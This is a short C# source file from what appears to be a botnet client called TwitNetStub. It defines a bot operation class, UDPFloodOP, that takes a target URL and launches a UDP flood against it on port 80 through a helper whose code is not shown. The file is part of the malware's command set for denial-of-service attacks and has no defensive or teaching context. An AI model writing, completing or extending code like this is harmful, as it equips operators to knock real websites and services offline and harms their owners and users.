using TwitNetStub.Util.Network;

namespace TwitNetStub.Operations
{
    class UDPFloodOP : IBotOperation
    {
        public bool Finished { get; set; }
        private string MainURL;
        private int Port;
        private int Threads;

        public UDPFloodOP(string url)
        {
            MainURL = url;
        }

        public void Initialize()
        {
            Port = 80;
            Threads = 1;
        }
        public void Run()
        {
            UDP.SfHost = MainURL;
            UDP.Port = Port;
            UDP.Threads = Threads;
            UDP.StartUDPFlood();
            //Finished = true;
        }
    }
}
